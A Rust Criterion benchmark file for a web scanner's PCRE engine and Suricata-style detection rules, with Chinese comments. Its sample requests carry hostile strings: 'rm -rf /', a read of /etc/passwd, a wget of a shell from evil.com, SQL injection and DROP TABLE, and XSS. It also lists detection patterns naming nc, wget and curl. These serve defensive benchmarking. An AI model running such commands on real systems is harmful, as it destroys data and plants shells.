//! PCRE性能基准测试
//!
//! 使用Criterion进行性能基准测试，比较不同PCRE处理方式的性能

use criterion::{black_box, criterion_group, criterion_main, Criterion, BenchmarkId};
use web_scan_rust::pcre::{PcreProcessor, PcrePattern, PcreMatchType};
use web_scan_rust::rules::{RuleManager, HttpMatchLocation};
use std::path::Path;

/// 基准测试：PCRE模式创建和编译
fn bench_pcre_pattern_creation(c: &mut Criterion) {
    let patterns = vec![
        "simple_pattern",
        "complex_.*pattern.*with.*quantifiers",
        r"\d{4}-\d{2}-\d{2}",  // 日期模式
        r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",  // 邮箱模式
        r"https?://[^\s/$.?#].[^\s]*",  // URL模式
    ];

    let mut group = c.benchmark_group("pcre_pattern_creation");

    for pattern in &patterns {
        group.bench_with_input(
            BenchmarkId::new("create_pattern", pattern),
            pattern,
            |b, pattern| {
                b.iter(|| {
                    let pcre_pattern = PcrePattern::new(pattern);
                    black_box(pcre_pattern);
                });
            },
        );
    }

    group.finish();
}

/// 基准测试：正则表达式匹配性能
fn bench_regex_matching(c: &mut Criterion) {
    let test_data = r#"
HTTP/1.1 200 OK
Content-Type: text/html
Server: Apache/2.4.41

<!DOCTYPE html>
<html>
<head><title>Login Page</title></head>
<body>
<form method="post" action="/login.php">
    Username: <input type="text" name="username" value="admin">
    Password: <input type="password" name="password" value="secret123">
    Email: <input type="email" name="email" value="user@example.com">
    <input type="submit" value="Login">
</form>
<script>alert('Welcome!');</script>
</body>
</html>
"#;

    let patterns = vec![
        ("email", r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
        ("html_tag", r"<[^>]+>"),
        ("script", r"<script[^>]*>.*?</script>"),
        ("form_field", r"<input[^>]*name=\"[^\"]+\""),
        ("password_field", r"<input[^>]*type=\"password\""),
    ];

    let mut group = c.benchmark_group("regex_matching");

    for (name, pattern) in &patterns {
        let pcre_pattern = PcrePattern::new(pattern);

        if let Some(ref regex) = pcre_pattern.compiled_regex {
            group.bench_with_input(
                BenchmarkId::new("match", name),
                &test_data,
                |b, data| {
                    b.iter(|| {
                        let result = regex.is_match(data);
                        black_box(result);
                    });
                },
            );
        }
    }

    group.finish();
}

/// 基准测试：规则加载性能
fn bench_rule_loading(c: &mut Criterion) {
    let rule_counts = vec![10, 50, 100, 500, 1000];

    let mut group = c.benchmark_group("rule_loading");

    for count in &rule_counts {
        group.bench_with_input(
            BenchmarkId::new("load_rules", count),
            count,
            |b, &count| {
                b.iter(|| {
                    let mut rule_manager = RuleManager::new();
                    let rules_content = generate_test_rules(count);
                    let rules_file = format!("/tmp/bench_test_{}.rules", count);
                    std::fs::write(&rules_file, rules_content).unwrap();

                    let result = rule_manager.load_rules_from_file(Path::new(&rules_file));
                    black_box(result.unwrap());

                    let _ = std::fs::remove_file(&rules_file);
                });
            },
        );
    }

    group.finish();
}

/// 基准测试：HTTP检测性能
fn bench_http_detection(c: &mut Criterion) {
    let mut rule_manager = RuleManager::new();
    let rules_content = generate_detection_rules();
    let rules_file = "/tmp/bench_detection.rules";
    std::fs::write(rules_file, rules_content).unwrap();

    rule_manager.load_rules_from_file(Path::new(rules_file)).unwrap();

    let http_requests = vec![
        // 简单请求
        "GET /index.html HTTP/1.1\r\nHost: example.com",

        // 带参数的请求
        "POST /login.php HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin&password=secret",

        // JSON请求
        "POST /api/user HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{\"name\":\"John\",\"email\":\"john@example.com\"}",

        // 复杂请求（包含潜在威胁）
        "POST /search.php HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nquery=test'; DROP TABLE users; --",
    ];

    let mut group = c.benchmark_group("http_detection");

    for (i, request) in http_requests.iter().enumerate() {
        group.bench_with_input(
            BenchmarkId::new("detect", i),
            request,
            |b, request_data| {
                b.iter(|| {
                    let result = rule_manager.match_content(request_data);
                    black_box(result);
                });
            },
        );
    }

    group.finish();

    let _ = std::fs::remove_file(rules_file);
}

/// 基准测试：PCRE处理器缓存性能
fn bench_pcre_processor_caching(c: &mut Criterion) {
    let mut group = c.benchmark_group("pcre_processor_caching");

    // 测试有缓存的情况
    group.bench_function("with_cache", |b| {
        b.iter(|| {
            let mut processor = PcreProcessor::new();

            // 多次处理相同模式（应该使用缓存）
            for _ in 0..100 {
                let _ = processor.process_pcre_pattern(
                    "/test_pattern/i",
                    HttpMatchLocation::Any,
                    false,
                    false,
                    None,
                    None,
                    None,
                    None,
                );
            }
        });
    });

    // 测试无缓存的情况（每次都创建新处理器）
    group.bench_function("without_cache", |b| {
        b.iter(|| {
            for _ in 0..100 {
                let mut processor = PcreProcessor::new();
                let _ = processor.process_pcre_pattern(
                    "/test_pattern/i",
                    HttpMatchLocation::Any,
                    false,
                    false,
                    None,
                    None,
                    None,
                    None,
                );
            }
        });
    });

    group.finish();
}

/// 基准测试：复杂正则表达式性能
fn bench_complex_regex(c: &mut Criterion) {
    let complex_patterns = vec![
        // SQL注入检测
        "(union|select|insert|update|delete).*from.*where",

        // XSS检测
        "<script[^>]*>.*?(alert|confirm|prompt)\\(.*?\\).*?</script>",

        // 路径遍历检测
        "\\.\\.[\\\\/][\\.\\./\\\\/]*",

        // 命令注入检测
        "[;&|`].*(cat|ls|rm|wget|curl|nc|netcat|python|perl|ruby)",

        // 文件包含检测
        "(include|require)[_\\-]*once?[\\s]*\\([^)]*\\)",
    ];

    let test_data = r#"
POST /vulnerable.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

input=test'; include '/etc/passwd'; rm -rf / &cmd=wget http://evil.com/shell.txt -O /tmp/shell.php
<script>alert('XSS Attack')</script>
SELECT * FROM users WHERE id = 1 UNION SELECT username,password FROM admin
"#;

    let mut group = c.benchmark_group("complex_regex");

    for (i, pattern) in complex_patterns.iter().enumerate() {
        let pcre_pattern = PcrePattern::new(pattern);

        if let Some(ref regex) = pcre_pattern.compiled_regex {
            group.bench_with_input(
                BenchmarkId::new("complex_match", i),
                &test_data,
                |b, data| {
                    b.iter(|| {
                        let result = regex.is_match(data);
                        black_box(result);
                    });
                },
            );
        }
    }

    group.finish();
}

/// 生成指定数量的测试规则
fn generate_test_rules(count: usize) -> String {
    let mut rules = String::new();

    for i in 0..count {
        rules.push_str(&format!(
            r#"
alert http any any -> any any (
    msg:"Test rule {}";
    pcre:"/test_pattern_{}/i";
    sid:{};
)
"#, i, i, 1000 + i
        ));
    }

    rules
}

/// 生成检测规则
fn generate_detection_rules() -> String {
    r#"
alert http any any -> any any (msg:"SQL Injection"; pcre:"/(union|select|insert|update|delete).*from/i"; sid:1001;)
alert http any any -> any any (msg:"XSS Attack"; pcre:"/<script[^>]*>.*?</script>/i"; sid:1002;)
alert http any any -> any any (msg:"Path Traversal"; pcre:"/\.\.[\/\\\\]/i"; sid:1003;)
alert http any any -> any any (msg:"Command Injection"; pcre:"/[;&|`].*(ls|cat|rm|wget|curl)/i"; sid:1004;)
alert http any any -> any any (msg:"Admin Access"; pcre:"/admin|administrator/i"; sid:1005;)
alert http any any -> any any (msg:"File Upload"; pcre:"/\.(php|jsp|asp|exe|bat|sh)$/i"; sid:1006;)
"#
.to_string()
}

criterion_group!(
    benches,
    bench_pcre_pattern_creation,
    bench_regex_matching,
    bench_rule_loading,
    bench_http_detection,
    bench_pcre_processor_caching,
    bench_complex_regex
);

criterion_main!(benches);